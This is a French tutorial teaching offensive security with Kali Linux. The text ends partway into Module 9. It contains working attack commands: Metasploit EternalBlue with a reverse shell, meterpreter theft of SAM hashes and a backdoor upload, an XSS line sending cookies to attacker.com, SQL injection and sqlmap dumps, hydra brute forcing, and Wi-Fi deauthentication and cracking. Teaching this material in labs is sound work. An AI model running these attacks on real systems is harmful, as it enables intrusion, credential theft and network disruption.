# Formation Complète : Hacking Éthique et Sécurité Offensive avec Kali Linux

> De débutant à pentesteur autonome : comprendre, pratiquer et maîtriser les techniques de hacking éthique, 
> de la reconnaissance à la post-exploitation — tout en respectant les lois, l'éthique et les limites légales.
>
> **Public visé** : curieux en cybersécurité, administrateur système, développeur voulant comprendre la sécurité offensive.  
> **Prérequis** : connaître Linux (navigation, permissions), bases en réseau (IP, ports, TCP/UDP).  
> **⚠️ Avertissement légal** : Ce contenu est **UNIQUEMENT** pour tester ta propre infra, des systèmes avec permission écrite, ou des labs. 
> Utiliser contre des systèmes que tu ne possèdes pas est **ILLÉGAL**.

---

## 📚 Table des matières

1. [Avant de commencer](#avant-de-commencer)
2. [Module 0 — Fondamentaux de cybersécurité et éthique](#module-0--fondamentaux-de-cybersécurité-et-éthique)
3. [Module 1 — Installation et setup de Kali Linux](#module-1--installation-et-setup-de-kali-linux)
4. [Module 2 — Reconnaissance (OSINT et reconnaissance passive)](#module-2--reconnaissance-osint-et-reconnaissance-passive)
5. [Module 3 — Scanning et énumération](#module-3--scanning-et-énumération)
6. [Module 4 — Identification de services et vulnérabilités](#module-4--identification-de-services-et-vulnérabilités)
7. [Module 5 — Exploitation basique](#module-5--exploitation-basique)
8. [Module 6 — Web Security (SQL Injection, XSS, CSRF)](#module-6--web-security-sql-injection-xss-csrf)
9. [Module 7 — Cryptographie et Hashing](#module-7--cryptographie-et-hashing)
10. [Module 8 — Wireless Security (Wi-Fi Hacking)](#module-8--wireless-security-wi-fi-hacking)
11. [Module 9 — Persistence et Post-Exploitation](#module-9--persistence-et-post-exploitation)
12. [Module 10 — Forensics et Incident Response](#module-10--forensics-et-incident-response)
13. [Module 11 — Automation et Scripts d'Attaque](#module-11--automation-et-scripts-dattaque)
14. [Module 12 — Défense et Hardening](#module-12--défense-et-hardening)
15. [Projets pratiques](#projets-pratiques)
16. [Ressources](#ressources)

---

## 🎯 Comment utiliser cette formation

Cette formation suit le même principe que l'enseignement en présentiel : chaque concept est expliqué **avant** d'être utilisé, jamais l'inverse.

**Règles d'or pour bien apprendre** :

1. **LÉGALITÉ D'ABORD.** Avant chaque exercice, demande-toi : "Ai-je le droit de le faire ?" Si la réponse est non, saute cet exercice.
2. **Exécute chaque commande toi-même.** Ne copie-colle jamais sans comprendre ce que tu fais. Le hacking sans compréhension = danger.
3. **Utilise un lab isolé.** VirtualBox, Docker, ou une machine de test dédiée. JAMAIS sur une machine de production.
4. **Fais les exercices avant de lire la correction.** Le hacking s'apprend en faisant.
5. **À la fin de chaque module, teste sur un lab que TU CONTRÔLES COMPLÈTEMENT.** Si tu doutes, tu ne le fais pas.

> **Règle d'or finale** : Le hacking éthique c'est avoir des compétences d'attaque pour mieux défendre. C'est pas pour faire du mal.

---

## Avant de commencer

### Ce dont tu as besoin

- Un ordinateur avec au moins 8 GB RAM (pour VirtualBox + Kali)
- VirtualBox ou VMware (gratuit)
- Image ISO Kali Linux
- Au moins **une machine de test** (une vieille VM, un Raspberry Pi, une machine virtuelle juste pour ça)
- **Un lab controlé** (pas d'Internet public, juste un réseau local)
- Accepter que c'est légal d'essayer seulement si tu le fais sur TES machines

### Qu'est-ce que tu vas apprendre

À la fin de cette formation, tu pourras :

✅ **Reconnaître** une cible (OSINT, reconnaissance passive)  
✅ **Scanner** une machine pour trouver les ports ouverts  
✅ **Identifier** les services et versions installées  
✅ **Trouver** les vulnérabilités connues  
✅ **Exploiter** une vulnérabilité pour prendre le contrôle  
✅ **Injecter du code** malveillant (SQL, XSS, RCE)  
✅ **Casser des mots de passe** (brute force, dictionnaire)  
✅ **Analyser** le trafic réseau  
✅ **Maintenir l'accès** (persistence)  
✅ **Couvrir tes traces** (log clearance)  
✅ **Défendre** une machine contre ces attaques  

---

## Module 0 — Fondamentaux de Cybersécurité et Éthique (1-2 jours)

### 0.1 Les trois piliers : CIA

Toute la cybersécurité repose sur trois concepts :

| Pilier | Signification | Exemple |
|--------|---|---|
| **C**onfidentiality | Seulement ceux qui ont le droit peuvent lire les données | Tes emails doivent être chiffrés, pas lisibles par tous |
| **I**ntegrity | Les données ne doivent pas être modifiées par quelqu'un de non autorisé | Si une banque change ton solde, c'est pas bon |
| **A**vailability | Les services doivent être disponibles quand tu en as besoin | Un site web qui crash 24/7 est pas dispo |

**Attaque typique** :

```
Attaquant veut :
  - Lire tes infos (C) → vol de données
  - Modifier tes données (I) → ransomware, changement de contenu
  - Rendre indispo (A) → DDoS
```

La défense, c'est protéger ces trois trucs.

### 0.2 Équipe Red/Blue/Purple

| Équipe | Rôle | Exemple |
|--------|------|---------|
| **Red Team** (Rouge) | Attaque, teste les défenses | Les hackers |
| **Blue Team** (Bleu) | Défend, sécurise les systèmes | Les administrateurs sécurité |
| **Purple Team** (Pourpre) | Entre les deux, apprend des deux côtés | Les pentesters éthiques |

**Tu es dans la Purple Team.** Tu apprends à attaquer pour mieux défendre.

### 0.3 Phases d'une attaque professionnelle

```
1. Reconnaissance      → Qui c'est ? Qu'est-ce qu'ils font ?
2. Scanning            → Quels ports/services sont ouverts ?
3. Énumération         → Quelles versions ? Quelles vulnérabilités ?
4. Exploitation        → On rentre comment ?
5. Privilege Escalation → Comment devenir admin ?
6. Persistence         → Comment rester indéfiniment ?
7. Covering Tracks     → Comment effacer les preuves ?
```

**Important** : une vraie attaque peut prendre des MOIS. Pas des secondes.

### 0.4 Éthique et Légalité

⚠️ **C'est ILLÉGAL de** :

- Scanner le réseau d'une entreprise sans permission écrite
- Accéder à un système que tu ne possèdes pas
- Voler des données
- Faire du DDoS
- Implanter des malwares "en blague"

✅ **C'est LÉGAL de** :

- Tester ta propre infrastructure
- Faire un pentest avec un contrat écrit
- Participer à un bug bounty officiel
- Utiliser des labs de pratique (HackTheBox, TryHackMe, DVWA)
- Apprendre sur une machine virtuelle isolée

**Règle simple** : Si tu dois te demander si c'est légal, c'est que ça l'est probablement pas.

### 0.5 Types de hacking

| Type | Objectif | Légal ? |
|------|----------|--------|
| **Black Hat** | Voler, détruire, ranço | ❌ NON |
| **White Hat** | Tester, defender, sécuriser | ✅ OUI (avec permission) |
| **Gray Hat** | Tester sans permission, mais sans mauvais intent | ⚠️ GRIS |

**Tu vas être White Hat.** Uniquement avec permission.

### 0.6 Outils de base (aperçu)

Tu vas utiliser :

- **nmap** : scanner de ports
- **wireshark** : analyser le trafic
- **metasploit** : framework d'exploitation
- **john** : cracker de passwords
- **sqlmap** : exploiter les injections SQL
- **aircrack-ng** : hacker le Wi-Fi
- **burp suite** : tester les apps web

Patience. Tu vas apprendre chacun.

---

## Module 1 — Installation et Setup de Kali Linux (1-2 jours)

### 1.1 Qu'est-ce que Kali Linux ?

Kali = distribution Linux faite **par des hackers, pour des hackers**. Préinstallée avec :

- 600+ outils de pentest
- Metasploit Framework
- Burp Suite
- Wireshark
- Nmap
- Et tout le reste

**Pas différent de Linux normal**, juste pré-équipé. C'est comme Ubuntu mais avec une "boîte à outils" énorme.

### 1.2 Installation (VirtualBox)

#### Option A : VirtualBox (Recommandé pour apprendre)

```bash
# 1. Télécharge VirtualBox
#    → https://www.virtualbox.org/wiki/Downloads

# 2. Télécharge Kali Linux ISO
#    → https://www.kali.org/get-kali/

# 3. Crée une nouvelle VM :
#    - Mémoire : 4GB minimum (8GB recommandé)
#    - Disque : 30GB minimum
#    - Processeurs : 2-4

# 4. Boot sur l'ISO et installe
```

#### Option B : Kali en VM préfaite

Kali propose des images VirtualBox déjà faites (plus facile).

```bash
# Télécharge Kali VirtualBox Image
# Importe dans VirtualBox
# Démarre
# Login : kali / kali
```

### 1.3 Premier boot et mise à jour

```bash
# Login
# user: kali
# password: kali

# Mettre à jour
sudo apt update
sudo apt upgrade -y

# Installer des outils supplémentaires (optionnel)
sudo apt install -y python3-pip build-essential

# Vérifier que Metasploit marche
msfconsole -v

# Vérifier que nmap marche
nmap --version
```

### 1.4 Configuration SSH

```bash
# Démarrer SSH
sudo systemctl start ssh

# Vérifier
sudo systemctl status ssh

# Regarder que SSH écoute sur le port 22
ss -tlnp | grep 22
```

### 1.5 Créer un utilisateur non-root

(C'est une bonne pratique, même si on part souvent en root sur Kali)

```bash
# Créer un utilisateur
sudo useradd -m -s /bin/bash hacker

# Donner le mot de passe
sudo passwd hacker

# Ajouter à sudoers
sudo usermod -aG sudo hacker

# Switcher vers le nouvel utilisateur
su - hacker
```

### 1.6 Setup des dossiers de travail

```bash
# Créer une structure de répertoires
mkdir -p ~/pentest/{recon,scanning,exploitation,tools}

# Où tu vas mettre :
# recon/        → résultats de reconnaissance
# scanning/     → résultats de scans
# exploitation/ → exploits, shells
# tools/        → scripts perso
```

---

## Module 2 — Reconnaissance (OSINT et Reconnaissance Passive) (2-3 jours)

### 2.1 Qu'est-ce que la reconnaissance ?

**Reconnaissance** = rassembler de l'info sur la cible **SANS** se faire remarquer.

```
Attaque normale :
  Scan direct → Cible sait qu'elle est scannée

Reconnaissance passive :
  Regarde les infos publiques → Cible ne sait rien
```

### 2.2 OSINT (Open Source Intelligence)

OSINT = info publique seulement. Tout sur Internet, Google, etc.

#### Informations basiques sur un domaine

```bash
# Voir les DNS records
whois google.com

# Résultat :
# Domain Name: GOOGLE.COM
# Registrant: Google LLC
# Creation Date: 1997-09-15
# Name Servers: NS1.GOOGLE.COM, NS2.GOOGLE.COM, ...

# Voir les nameservers
nslookup -type=NS google.com

# Voir les adresses IP
dig google.com +short

# Voir les MX records (mail)
dig google.com MX +short

# Résultat :
# 5 gmail-smtp-in.l.google.com.
# 10 alt1.gmail-smtp-in.l.google.com.
```

#### Outils de reconnaissance dans Kali

```bash
# theharvester : scrape les infos publiques
theharvester -d google.com -l 500 -b google

# Résultat :
# Email addresses found:
#   - ...
# Hosts found:
#   - 142.250.80.46
#   - ...

# Shodan : moteur de recherche pour les serveurs (internet-wide scanner)
# ⚠️ (faut un compte)
# → https://www.shodan.io/
```

#### OSINT sur une personne

```bash
# Recherche sur Google
# "John Doe" site:linkedin.com
# → Voir son profil public

# Voir ses comptes social media
# Twitter, Facebook, Instagram

# Voir ses email leakés
# → https://haveibeenpwned.com/
```

### 2.3 Reconnaissance passive : métadonnées

Les fichiers contiennent souvent des infos qu'on voudrait cacher.

```bash
# Télécharger un PDF du site cible
wget https://target.com/report.pdf

# Extraire les métadonnées
exiftool report.pdf

# Résultat :
# Creator: John Doe
# Creation Date: 2023-01-15
# Producer: Microsoft Word
# Author: John Doe
```

### 2.4 Énumération DNS

```bash
# Zone transfer (essayer de télécharger toute la zone DNS)
nslookup -type=AXFR google.com ns1.google.com

# (Presque jamais ça marche, mais ça coûte rien de demander)

# Reverse DNS (qui a cette IP ?)
nslookup -type=PTR 142.250.80.46

# Résultat :
# 46.80.250.142.in-addr.arpa name = bru06s03-in-f46.1e100.net.
```

### 2.5 Sous le capot : pourquoi la reconnaissance passive ?

```
Si tu scans directement :
  1. Tu dis "Hé, je vais te scanner"
  2. Logs : "Quelqu'un du 192.168.1.100 m'a scanné"
  3. Alerte de sécurité
  4. Ils changent les règles firewall
  5. Tu es découvert

Si tu uses OSINT :
  1. Tu regardes juste ce qui est public
  2. Zéro contact
  3. Ils savent pas que tu existes
  4. Tu scannes après, tu connais déjà une partie de ce que tu trouveras
```

### 2.6 Exercice

1. Fais un `whois` sur un domaine que tu contrôles
2. Utilise `dig` pour voir les DNS records
3. Essaie `theharvester` sur un domaine public
4. Recherche sur Shodan (juste regarde, compte gratuit limité)
5. Cherche des infos sur un domaine sur Google

---

## Module 3 — Scanning et Énumération (2-3 jours)

### 3.1 Qu'est-ce que Nmap ?

**Nmap** = le scanner de ports le plus utilisé du monde. Il dit "quels ports sont ouverts ?"

```
Nmap envoi des paquets spéciaux → Machine répond avec "ce port est ouvert"
```

### 3.2 Installation

```bash
# Kali l'a déjà, mais pour être sûr
sudo apt install -y nmap

# Vérifier
nmap --version
```

### 3.3 Scan basique

```bash
# Scanner une machine (très bruyant, elle saura qu'on la scanne)
nmap 192.168.1.1

# Résultat :
# Starting Nmap 7.92
# Nmap scan report for 192.168.1.1
# Host is up (0.0015s latency).
# Not shown: 997 closed ports
# PORT    STATE    SERVICE
# 22/tcp  open     ssh
# 80/tcp  open     http
# 443/tcp open     https
```

### 3.4 Types de scans

```bash
# Scan TCP SYN (par défaut, le plus courant)
nmap -sS 192.168.1.1

# Scan TCP Connect
nmap -sT 192.168.1.1

# Scan UDP (plus lent)
nmap -sU 192.168.1.1

# Scan combiné TCP + UDP
nmap -sS -sU 192.168.1.1

# Scan stealth (FIN, NULL, Xmas)
nmap -sF 192.168.1.1    # FIN scan

# Scan de tous les ports (au lieu de juste les 1000 courants)
nmap -p- 192.168.1.1

# Scan d'un port spécifique
nmap -p 22 192.168.1.1

# Scan d'une plage
nmap -p 1-1000 192.168.1.1
```

### 3.5 Versioning et OS detection

```bash
# Détecter les versions des services
nmap -sV 192.168.1.1

# Résultat :
# PORT    STATE SERVICE VERSION
# 22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
# 80/tcp  open  http    Apache httpd 2.4.6
# 443/tcp open  https   Apache httpd 2.4.6 (SSL/TLS)

# Détecter l'OS
nmap -O 192.168.1.1

# Résultat :
# Running: Linux 4.10 - 5.6
```

### 3.6 Scripts NSE

Nmap a des **scripts** pour faire des tests spécifiques.

```bash
# Lister tous les scripts
ls /usr/share/nmap/scripts/ | head -20

# Utiliser les scripts par défaut (safe)
nmap -sC 192.168.1.1

# Utiliser des scripts spécifiques
nmap --script=ssl-enum-ciphers -p 443 192.168.1.1

# Résultat :
# | Cipher    Kex       Enc   Auth Tag
# | TLS_RSA_WITH_AES_128_CBC_SHA ...

# Utiliser des scripts intrusive (attention !)
nmap --script=smb-os-discovery 192.168.1.1
```

### 3.7 Scans "furtifs" (evasion)

```bash
# Fragmenter les paquets (evade les filtres)
nmap -f 192.168.1.1

# Utiliser des décoys (faire croire qu'on scanne de plusieurs adresses)
nmap -D 192.168.1.50, 192.168.1.51, ME 192.168.1.1

# Ralentir le scan pour être moins détectable (Paranoid)
nmap -T0 192.168.1.1    # T0 = très lent
nmap -T1 192.168.1.1    # T1 = lent
nmap -T2 192.168.1.1    # T2 = assez lent
nmap -T3 192.168.1.1    # T3 = normal
nmap -T4 192.168.1.1    # T4 = agressif
nmap -T5 192.168.1.1    # T5 = très agressif
```

### 3.8 Sauvegarder les résultats

```bash
# Format texte
nmap -oN results.txt 192.168.1.1

# Format XML (plus facile à parser)
nmap -oX results.xml 192.168.1.1

# Format Grepable (pour des scripts)
nmap -oG results.gnmap 192.168.1.1

# Tous les formats
nmap -oA results 192.168.1.1
```

### 3.9 Scanner un réseau complet

```bash
# Scanner tout un sous-réseau (attention c'est très bruyant !)
nmap -p 22,80,443 192.168.1.0/24 -oN network_scan.txt

# Résultat : toutes les machines du réseau avec ces ports ouverts
```

### 3.10 Exercice

1. Scanne ta machine locale (127.0.0.1)
2. Détecte les versions des services
3. Utilise les scripts NSE pour plus de détails
4. Essaie un scan UDP
5. Sauvegarde les résultats

---

## Module 4 — Identification de Services et Vulnérabilités (2 jours)

### 4.1 Après Nmap, quoi ?

Maintenant tu sais **quels ports** sont ouverts. Prochaine étape : **quelles vulnérabilités** ?

### 4.2 Rechercher les vulnérabilités

#### Databases de vulnérabilités

```bash
# CVE Database
# → https://cve.mitre.org/

# SearchSploit : database d'exploits
sudo apt install -y exploitdb

searchsploit apache 2.4.6

# Résultat :
# Apache 2.4.6 - ... CVE-2013-1862 | 26347 |
# Apache 2.4.6 - ... Mod Rewrite Bypass | 26915 |
```

### 4.3 Enum4linux (SMB enumeration)

SMB = partage de fichiers Windows. Souvent mal configuré.

```bash
# Installer
sudo apt install -y enum4linux

# Enumérer un serveur SMB
enum4linux -a 192.168.1.100

# Résultat :
# User accounts found :
#   - admin
#   - user1
#   - user2
# Shares found :
#   - IPC$
#   - admin
#   - user_files
# Printers found :
#   - Canon LBP6C
```

### 4.4 Nikto (Web server scanner)

```bash
# Installer
sudo apt install -y nikto

# Scanner un serveur web
nikto -h 192.168.1.100

# Résultat :
# + Server: Apache/2.4.6
# + Root page / redirects to: /login.html
# + /admin/ : Administrative directory found
# + /wp-admin/ : Wordpress Admin found
# + /backup.zip : Backup file found (dangerous!)
# + Outdated version detected
```

### 4.5 Nessus (Vulnerability Scanner Professionnel)

Nessus = très puissant (mais propriétaire et cher). Version gratuite disponible.

```bash
# Télécharger
# → https://www.tenable.com/products/nessus/nessus-essentials

# Installer
sudo dpkg -i Nessus-X.X.X-debian6_amd64.deb

# Démarrer
sudo /etc/init.d/nessusd start

# Accéder via navigateur
# → https://localhost:8834
```

### 4.6 Sous le capot : types de vulnérabilités

```
Input Validation      → Les données de l'user ne sont pas vérifiées (SQL injection)
Authentication Issues → Mauvais mot de passe, no 2FA
Authorization Issues  → Accès à des ressources qu'on devrait pas avoir
Unpatched Services    → Vieux versions avec des failles connues
Default Credentials   → Admin/admin pas changé
Misconfiguration      → Settings dangereux par défaut
```

### 4.7 Exercice

1. Scanne ta machine avec Nmap
2. Identifie les services
3. Recherche les CVE associées
4. Utilise Nikto si tu as un serveur web
5. Cherche les exploits sur SearchSploit

---

## Module 5 — Exploitation Basique (3-4 jours)

### 5.1 Qu'est-ce que l'exploitation ?

**Exploitation** = utiliser une vulnérabilité trouvée pour prendre le contrôle du système.

```
Avant : Juste savoir qu'il y a une faille
Après exploitation : On est DEDANS
```

### 5.2 Metasploit Framework

Metasploit = la plus grande collection d'exploits et de payloads du monde.

```bash
# Lancer Metasploit
msfconsole

# Résultat :
# msf6 >
```

### 5.3 Structure de Metasploit

```
Modules :
  - Exploits    : code qui exploite une vulnérabilité
  - Payloads    : code qu'on veut exécuter APRÈS exploitation
  - Encoders    : encoder pour evade les antivirus
  - Auxiliaries : outils (scanners, etc.)

Workflow typique :
  1. Cherche un exploit pour ta vulnérabilité
  2. Définis le payload (obtenir une shell, voler des données)
  3. Définis les options (RHOSTS, LHOST, etc.)
  4. Exécute
  5. T'as une shell ! 🎉
```

### 5.4 Chercher un exploit

```bash
msfconsole

msf6 > search apache 2.4.6

# Résultat :
# Matching Modules
# ================
#  #  Name                              ...
#  0  exploit/multi/http/struts2_... 
#  1  auxiliary/scanner/http/dir_scanner
#  ...
```

### 5.5 Utiliser un exploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Voir les options
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

# Résultat :
# Name              Current Setting  Required  Description
# ----              ----------------  --------  -----------
# LHOST             0.0.0.0           yes       Local listening host for reverse shell
# LPORT             4444              yes       Local port for reverse shell
# PAYLOAD                             yes       Which payload to use
# RHOSTS            0.0.0.0           yes       Target host(s)
# ...

# Configurer les options
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Vérifier
options

# Exécuter
exploit

# Si ça marche :
# [*] Sending payload...
# [+] Shell session opened!
# meterpreter >
```

### 5.6 Meterpreter shell

Une fois qu'on a une "meterpreter" shell, on peut faire plein de trucs.

```bash
# Commandes utiles

# Voir des infos sur la machine
sysinfo

# Voir les processus
ps

# Voir les fichiers
ls

# Télécharger un fichier
download C:\\windows\\system32\\sam

# Uploader un fichier
upload /tmp/backdoor.exe C:\\windows\\system32\\

# Changer le directory
cd C:\\users\\admin

# Exécuter une commande
shell

# Voir les users
getuid

# Escalader les privilèges
getsystem
```

### 5.7 Reverse Shell vs Bind Shell

| Type | Qu'est-ce que c'est | Quand l'utiliser |
|------|---|---|
| **Reverse Shell** | La cible se connecte À TOI | Cible derrière firewall (bloque les connexions entrantes) |
| **Bind Shell** | Tu te connectes À LA CIBLE | La cible accepte les connexions |

```
Reverse Shell :
  1. Tu ouvres un listener sur ton port
  2. Tu exploites la cible
  3. La cible se connecte À TOI
  4. T'as une shell

Bind Shell :
  1. Tu exploites la cible
  2. La cible ouvre un port
  3. Tu te connectes À CE PORT
  4. T'as une shell
```

### 5.8 Exercice

1. Lance msfconsole
2. Cherche un exploit pour un service connu
3. Configure les options
4. Exécute
5. Joue avec la meterpreter shell

(Sur ta machine de test seulement !)

---

## Module 6 — Web Security (SQL Injection, XSS, CSRF) (3-4 jours)

### 6.1 Qu'est-ce que les vulnérabilités web ?

Les apps web sont souvent directement accessible sur Internet. Facile à attaquer.

```
URL : https://target.com/login.php?username=admin&password=test
     ↑                          ↑
     Le serveur reçoit DIRECTEMENT l'input de l'user
     Pas toujours validé → Vulnérable
```

### 6.2 SQL Injection

Une des vulnérabilités les plus courantes et dangereuses.

#### Comment ça marche

```sql
-- Requête normale
SELECT * FROM users WHERE username='admin' AND password='123456';

-- Si l'attaquant envoie comme password : ' OR '1'='1
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';
       ↑ Les single quotes ferment la string
       ↑ OR '1'='1' sera TOUJOURS vrai
       ↑ Donc retourne TOUS les users
```

#### Pratique avec DVWA

DVWA = Damn Vulnerable Web App (app intentionnellement vulnérable pour apprendre)

```bash
# Installer DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker pull vulnerables/web-dvwa
docker run -p 80:80 vulnerables/web-dvwa

# Accéder via navigateur
# → http://localhost/
# Login : admin / password
```

#### Faire une SQL injection

```bash
# Dans le champ login, essayer :
Username : admin' OR '1'='1
Password : n'importe quoi

# La requête devient :
SELECT * FROM users WHERE username='admin' OR '1'='1' AND ...
# Qui se connecte comme admin sans avoir le bon password !
```

#### SQLMap (Automatiser les injections SQL)

```bash
# Installer
sudo apt install -y sqlmap

# Tester si un site est vulnérable
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username

# Dumper la base de données
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dump-all
```

### 6.3 XSS (Cross-Site Scripting)

Injecter du JavaScript qui s'exécute dans le navigateur d'autres utilisateurs.

#### Comment ça marche

```html
<!-- Site normal -->
<div id="comment">
  <!-- L'user peut entrer du texte ici -->
</div>

<!-- L'attaquant envoie -->
<script>alert('Hacké !')</script>

<!-- Le HTML rendu -->
<div id="comment">
  <script>alert('Hacké !')</script>
</div>

<!-- Chaque personne qui visite la page voit l'alerte -->
```

#### Utilisation dangereuse

```javascript
// Vol de cookies (session)
fetch('http://attacker.com/steal.php?cookie=' + document.cookie)

// Redirection vers un fake login
window.location = 'http://attacker.com/fake_login'

// Modification du contenu de la page
document.body.innerHTML = '<h1>Hacké !</h1>'
```

#### Protection contre XSS

```bash
# Valider l'input (virer les caractères dangereux)
# Encoder l'output (convertir < en &lt; par exemple)
# Content Security Policy (CSP) : dire "juste ce script peut s'exécuter"
```

### 6.4 CSRF (Cross-Site Request Forgery)

Faire exécuter une action au user sans qu'il le sache.

#### Comment ça marche

```html
<!-- Tu visites attacker.com -->
<!-- Caché dans la page -->
<img src="http://bank.com/transfer.php?to=attacker&amount=1000000">

<!-- Quand l'image charge, tu envoies une requête à ta banque
     Si tu es loggé, la banque pense que C'EST TOI qui la demande
     L'argent part ! -->
```

#### Protection contre CSRF

```
- Token CSRF : chaque formulaire a un token unique
- SameSite Cookies : cookie envoyé seulement si c'est le même site
```

### 6.5 Burp Suite (Web Proxy)

Burp = tool pour tester les apps web. Proxy = interception de requêtes.

```bash
# Installer (Community Edition gratuite)
# → https://portswigger.net/burp

# Lancer
burpsuite

# Configuration :
# 1. Configure ton navigateur pour passer par Burp (localhost:8080)
# 2. Envoie une requête
# 3. Burp l'intercepte
# 4. Tu peux la modifier avant d'envoyer
# 5. Vois la réponse complète
```

### 6.6 Exercice

1. Installe DVWA
2. Essaie une SQL injection basique
3. Utilise SQLMap pour automatiser
4. Essaie une XSS injection
5. Utilise Burp Suite pour intercepter les requêtes

---

## Module 7 — Cryptographie et Hashing (2-3 jours)

### 7.1 Hashing vs Encryption

| Concept | Direction | Réversible ? | Cas d'usage |
|---------|-----------|---|---|
| **Hashing** | À sens unique | ❌ Non (en théorie) | Stocker les passwords |
| **Encryption** | Bidirectionnel | ✅ Oui | Chiffrer les messages |

### 7.2 Hashing courant

```bash
# MD5 (À NE PAS UTILISER, cassé depuis longtemps)
echo -n "password" | md5sum
# Résultat : 5f4dcc3b5aa765d61d8327deb882cf99

# SHA-1 (Déprécié, mais courant dans les vieilles apps)
echo -n "password" | sha1sum
# Résultat : 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

# SHA-256 (Standard moderne)
echo -n "password" | sha256sum
# Résultat : 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

# Bcrypt (Très bon, avec salt, résiste au brute force)
# (Faut installer)
sudo apt install -y python3-bcrypt

python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(12)))"
# Résultat : b'$2b$12$...'
```

### 7.3 Cracker les hashes

```bash
# Installer
sudo apt install -y john

# Fichier de wordlist
# /usr/share/wordlists/rockyou.txt (très commun)

# Cracker une liste de hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Résultat :
# password          (john)
# admin123          (admin)
# letmein           (user1)
# ...

# Avec des options
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha256 hashes.txt

# Utiliser des règles (modifier les words)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# (Avec rules : password → password1, password!, PASSWORD, etc.)
```

#### Online Hash Cracking

```bash
# Sites comme :
# → https://www.md5online.org/
# → https://crackstation.net/

# Juste colle le hash et il le craque (si c'est un mot commun)
```

### 7.4 Brute Force

Essayer TOUS les passwords possibles.

```bash
# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Résultat :
# [22][ssh] host: 192.168.1.100   login: admin   password: admin123

# Brute force HTTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://192.168.1.100/login.php:user=^USER^&pass=^PASS^:Invalid

# Options
# -l : username unique
# -L : fichier de usernames
# -p : password unique
# -P : fichier de passwords
# -t : threads (4, 8, 16...)
```

### 7.5 Rainbow Tables

Au lieu de cracker un hash à chaque fois, avoir une table pré-calculée.

```bash
# Utiliser une rainbow table
# → https://www.cmd5.com/
# → https://md5decrypt.org/

# Juste colle le hash, il cherche dans la table
```

### 7.6 Dictionnaire vs Brute Force

| Méthode | Speed | Efficacité |
|---------|-------|-----------|
| **Dictionnaire** | Très rapide | Très bon (si password courant) |
| **Brute Force** | Très lent | Garantit de trouver (tôt ou tard) |
| **Hybrid** | Moyen | Bon (dictionnaire + modifications) |

### 7.7 Exercice

1. Hash quelques passwords avec différentes méthodes
2. Essaie de les cracker avec John
3. Fais un brute force sur un service de test
4. Utilise une rainbow table online

---

## Module 8 — Wireless Security (Wi-Fi Hacking) (2-3 jours)

### 8.1 Wi-Fi = juste du réseau sans fil

```
Sécurité Wi-Fi :
  - WEP (Vieux, cassé)
  - WPA (Moyen, ok pour du vieux)
  - WPA2 (Bon standard)
  - WPA3 (Meilleur, moderne)
```

### 8.2 aircrack-ng (Suite de tools)

```bash
# Vérifier que tu as une carte Wi-Fi compatible
iwconfig

# Mettre en mode monitor (essayer de voir TOUS les paquets)
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Maintenant wlan0mon est en mode monitor
iwconfig wlan0mon
# Mode:Monitor
```

### 8.3 Scan des réseaux Wi-Fi

```bash
# Voir les réseaux disponibles
sudo airodump-ng wlan0mon

# Résultat :
# BSSID              PWR  Beacons    CH  ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -42  123       6   WPA2 CCMP  PSK  MyNetwork
# 11:22:33:44:55:66  -68  45        11  Open      MyPublicWiFi
```

**ENC** = Encryption (WPA2, WPA, Open)  
**PWR** = Signal strength

### 8.4 Cracker WPA/WPA2

```bash
# Capturer le handshake (échange de clés)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Lance ça pour capturer, puis dans un autre terminal :
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Ça désauthentifie les clients
# Quand ils se reconnectent, tu captures le handshake

# Une fois qu'tu as le handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Résultat :
# KEY FOUND! [ password123 ]
```

### 8.5 Sous le capot : WPA Handshake

```
Quand tu te connectes au Wi-Fi :
  1. Client envoie sa password
  2. AP (Access Point) la vérifie
  3. Échange de clés = "Handshake"

Si tu captures ce handshake, tu peux tester les passwords offline
(beaucoup plus rapide qu'en ligne)
```

### 8.6 Attaques avancées

```bash
# Evil Twin (créer un faux Wi-Fi)
# (À faire en labo seulement !)

# Packet injection
aireplay-ng -9 wlan0mon
# Test si tu peux injecter des paquets (important pour les attaques)

# Déauthentification (disconnecter les clients)
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 8.7 ⚠️ LEGAL WARNING

```
Wi-Fi hacking sans permission = ILLÉGAL.
- Cracker ta propre Wi-Fi = OK
- Cracker le Wi-Fi de quelqu'un d'autre = PRISON

Même les tests de sécurité pro doivent avoir un contrat écrit.
```

### 8.8 Exercice

1. Configure le mode monitor
2. Scan les réseaux Wi-Fi
3. Essaie de capturer un handshake (ta propre Wi-Fi)
4. Essaie de le cracker avec John

---

## Module 9 — Persistence et Post-Exploitation (2-3 jours)

### 9.1 Persistence = rester dans le système longtemps

```
Exploitation = tu entres une fois
Persistence = tu laisses une porte d'arrière

Si la faille se ferme, tu peux toujours revenir
```

### 9.2 Types de persistence

| Type | Méthode | Détection |
|------|--------|-----------|
| **Backdoor** | Créer un compte administrateur caché | Difficile (avec les bons tools) |
| **Rootkit** | Modifier le système pour se cacher | Très difficile |
| **Web Shell** | Uploader un fichier PHP/ASP | Facile si on cherche les fichiers suspects |
